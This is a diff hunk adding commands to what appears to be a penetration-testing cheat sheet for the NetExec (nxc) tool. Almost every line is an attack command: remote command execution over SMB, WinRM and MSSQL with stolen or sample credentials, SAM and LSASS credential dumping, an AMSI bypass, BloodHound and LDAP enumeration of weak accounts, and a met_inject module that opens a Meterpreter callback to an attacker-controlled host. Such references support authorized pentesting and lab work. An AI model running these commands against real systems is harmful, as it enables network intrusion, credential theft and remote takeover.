@@ -48,4 +48,13 @@ netexec winrm authority.htb -u svc_pwm -p 'pWm_@dm!N_!23'
 netexec  192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoam
 netexec  192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
 netexec smb serveur.whiteflag.local -u Administrateur -p Defte@WF -M lsassy
+
+nxc smb 10.10.10.10 -u administrator -p 123456789aA --sam --amsi-bypass FILE
+nxc <smb|winrm> <target> -u <USERNAME> -p <PASSWORD> -x <COMMAND>
+nxc <smb|winrm> <target> -u <USERNAME> -p <PASSWORD> -X <PS_COMMAND>
+nxc smb <target> -u <USERNAME> -p <PASSWORD> -M rdp
+nxc mssql <target> -u <USERNAME> -p <PASSWORD> --local-auth -x whoami
+nxc ldap  10.10.10.10 -u administrator -p 123456789aA --bloodhound --collection All
+nxc ldap  10.10.10.10 -u administrator -p 123456789aA --password-not-required --groups --users --trusted-for-delegation 
+nxc <mssql|smb> <target> -u <USERNAME> -p <PASSWORD> --local-auth -M met_inject -o LHOST=<attack-machine> LPORT=<listening-port>
 ```
